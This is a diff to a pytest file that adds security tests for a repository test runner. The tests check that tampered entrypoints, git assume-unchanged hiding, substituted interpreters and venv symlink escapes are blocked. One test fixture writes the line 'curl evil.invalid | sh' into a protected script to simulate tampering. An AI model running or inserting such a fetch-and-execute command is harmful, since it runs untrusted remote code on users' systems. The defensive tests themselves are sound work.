@@ -102,6 +102,8 @@ def test_changed_console_entrypoint_target_fails(checkout: Path) -> None:
         ),
         encoding="utf-8",
     )
+    _git(checkout, "add", "pyproject.toml")
+    _git(checkout, "commit", "-qm", "change console entrypoint")
     report = _fixture_report(checkout)
     assert report["state"] == closure.BLOCKED
     assert "ENTRYPOINTS" in {item["code"] for item in report["findings"]}
@@ -203,6 +205,17 @@ def test_runner_mode_is_bound_to_attested_git_index(checkout: Path) -> None:
     report = _fixture_report(checkout)
     assert report["state"] == closure.BLOCKED
     assert "ARTIFACT_MODE" in {item["code"] for item in report["findings"]}
+
+
+def test_assume_unchanged_cannot_hide_protected_artifact_bytes(checkout: Path) -> None:
+    relative = "scripts/run_tests_v1.sh"
+    _git(checkout, "update-index", "--assume-unchanged", relative)
+    target = checkout / relative
+    target.write_text("#!/bin/sh\ncurl evil.invalid | sh\n", encoding="utf-8")
+    assert _git(checkout, "status", "--porcelain", "--untracked-files=all") == ""
+    report = _fixture_report(checkout)
+    assert report["state"] == closure.BLOCKED
+    assert "ARTIFACT_HEAD_MISMATCH" in {item["code"] for item in report["findings"]}
 
 
 def test_home_pytest_plugin_cannot_affect_receipt_grade_result(
@@ -322,6 +335,7 @@ def _fake_venv(path: Path) -> None:
     bin_dir = path / "bin"
     bin_dir.mkdir(parents=True)
     (bin_dir / "activate").write_text("# test fixture\n", encoding="utf-8")
+    (path / "pyvenv.cfg").write_text("home = test\n", encoding="utf-8")
     wrapper = bin_dir / "python"
     wrapper.write_text(f'#!/bin/sh\nexec "{sys.executable}" "$@"\n', encoding="utf-8")
     wrapper.chmod(0o755)
@@ -366,6 +380,21 @@ def test_runner_preserves_explicit_shared_home_developer_convenience(tmp_path: P
     assert '"PYTEST_PLUGINS": "pytest_live_guard"' in result.stdout
 
 
+@pytest.mark.skipif(not Path("/bin/bash").exists(), reason="system Bash unavailable")
+def test_wrapper_zero_arg_invocation_is_bash_3_compatible(tmp_path: Path) -> None:
+    root = _runner_fixture(tmp_path)
+    _fake_venv(root / ".venv")
+    result = subprocess.run(
+        ["/bin/bash", str(root / "scripts" / "run_tests.sh")],
+        env=os.environ,
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert result.returncode == 0, result.stderr
+    assert "interpreter_provenance=repo-local" in result.stdout
+
+
 def test_runner_receipt_mode_uses_isolated_home_and_no_home_plugin(tmp_path: Path) -> None:
     root = _runner_fixture(tmp_path)
     _fake_venv(root / ".venv")
@@ -401,7 +430,7 @@ def test_runner_receipt_mode_prefers_exact_explicit_venv_over_stale_dot_venv(
     _fake_venv(selected)
     result = subprocess.run(
         [str(root / "scripts" / "run_tests_v1.sh"), "--receipt-mode"],
-        env={**os.environ, "HERMES_RECEIPT_VENV": str(selected)},
+        env={**os.environ, "HERMES_RECEIPT_VENV": str(selected), "HERMES_BOOTSTRAP_TRUSTED_PYTHON": sys.executable},
         capture_output=True,
         text=True,
         check=False,
@@ -420,7 +449,7 @@ def test_runner_receipt_mode_refuses_missing_explicit_venv_without_fallback(
     missing = root / ".bootstrap-proof-venv"
     result = subprocess.run(
         [str(root / "scripts" / "run_tests_v1.sh"), "--receipt-mode"],
-        env={**os.environ, "HERMES_RECEIPT_VENV": str(missing)},
+        env={**os.environ, "HERMES_RECEIPT_VENV": str(missing), "HERMES_BOOTSTRAP_TRUSTED_PYTHON": sys.executable},
         capture_output=True,
         text=True,
         check=False,
@@ -443,7 +472,7 @@ def test_v1_runner_refuses_nonallowlisted_interpreter_before_execution(
     (selected / "bin" / "python").chmod(0o755)
     result = subprocess.run(
         [str(root / "scripts" / "run_tests_v1.sh"), "--receipt-mode"],
-        env={**os.environ, "HERMES_RECEIPT_VENV": str(selected)},
+        env={**os.environ, "HERMES_RECEIPT_VENV": str(selected), "HERMES_BOOTSTRAP_TRUSTED_PYTHON": sys.executable},
         capture_output=True,
         text=True,
         check=False,
@@ -461,13 +490,27 @@ def test_runner_receipt_mode_refuses_empty_explicit_venv(
     _fake_venv(root / ".venv")
     result = subprocess.run(
         [str(root / "scripts" / "run_tests_v1.sh"), "--receipt-mode"],
-        env={**os.environ, "HERMES_RECEIPT_VENV": value},
+        env={**os.environ, "HERMES_RECEIPT_VENV": value, "HERMES_BOOTSTRAP_TRUSTED_PYTHON": sys.executable},
         capture_output=True,
         text=True,
         check=False,
     )
     assert result.returncode != 0
     assert "explicit receipt virtualenv is empty" in result.stderr
+    assert result.stdout == ""
+
+
+def test_wrapper_receipt_mode_refuses_empty_explicit_venv(tmp_path: Path) -> None:
+    root = _runner_fixture(tmp_path)
+    result = subprocess.run(
+        [str(root / "scripts" / "run_tests.sh"), "--receipt-mode"],
+        env={**os.environ, "HERMES_RECEIPT_VENV": ""},
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert result.returncode == 2
+    assert "Hermes bootstrap venv is empty" in result.stderr
     assert result.stdout == ""
 
 
@@ -482,7 +525,7 @@ def test_runner_receipt_mode_refuses_parent_escape_and_symlink(
             selected.symlink_to(outside, target_is_directory=True)
         result = subprocess.run(
             [str(root / "scripts" / "run_tests_v1.sh"), "--receipt-mode"],
-            env={**os.environ, "HERMES_RECEIPT_VENV": str(selected)},
+            env={**os.environ, "HERMES_RECEIPT_VENV": str(selected), "HERMES_BOOTSTRAP_TRUSTED_PYTHON": sys.executable},
             capture_output=True,
             text=True,
             check=False,
@@ -494,7 +537,7 @@ def test_runner_receipt_mode_refuses_parent_escape_and_symlink(
     trailing = f"{root / '.bootstrap-proof-venv'}/"
     result = subprocess.run(
         [str(root / "scripts" / "run_tests_v1.sh"), "--receipt-mode"],
-        env={**os.environ, "HERMES_RECEIPT_VENV": trailing},
+        env={**os.environ, "HERMES_RECEIPT_VENV": trailing, "HERMES_BOOTSTRAP_TRUSTED_PYTHON": sys.executable},
         capture_output=True,
         text=True,
         check=False,
@@ -502,3 +545,43 @@ def test_runner_receipt_mode_refuses_parent_escape_and_symlink(
     assert result.returncode != 0
     assert "not admitted" in result.stderr
     assert result.stdout == ""
+
+
+def test_runner_refuses_hostile_python_inside_admitted_venv(tmp_path: Path) -> None:
+    root = _runner_fixture(tmp_path)
+    selected = root / ".bootstrap-proof-venv"
+    _fake_venv(selected)
+    hostile = tmp_path / "hostile-python"
+    marker = tmp_path / "hostile-ran"
+    hostile.write_text(f"#!/bin/sh\ntouch '{marker}'\nexit 0\n", encoding="utf-8")
+    hostile.chmod(0o755)
+    (selected / "bin" / "python").unlink()
+    (selected / "bin" / "python").symlink_to(hostile)
+    result = subprocess.run(
+        [str(root / "scripts" / "run_tests_v1.sh"), "--receipt-mode"],
+        env={**os.environ, "HERMES_RECEIPT_VENV": str(selected), "HERMES_BOOTSTRAP_TRUSTED_PYTHON": sys.executable},
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert result.returncode != 0
+    assert "interpreter provenance is unsafe" in result.stderr
+    assert not marker.exists()
+
+
+def test_runner_unset_receipt_selection_cannot_follow_dot_venv_escape(tmp_path: Path) -> None:
+    root = _runner_fixture(tmp_path)
+    outside = tmp_path / "outside-default-venv"
+    _fake_venv(outside)
+    (root / ".venv").symlink_to(outside, target_is_directory=True)
+    environment = {key: value for key, value in os.environ.items() if key != "HERMES_RECEIPT_VENV"}
+    environment["HERMES_BOOTSTRAP_TRUSTED_PYTHON"] = sys.executable
+    result = subprocess.run(
+        [str(root / "scripts" / "run_tests_v1.sh"), "--receipt-mode"],
+        env=environment,
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert result.returncode != 0
+    assert "escapes the repository" in result.stderr
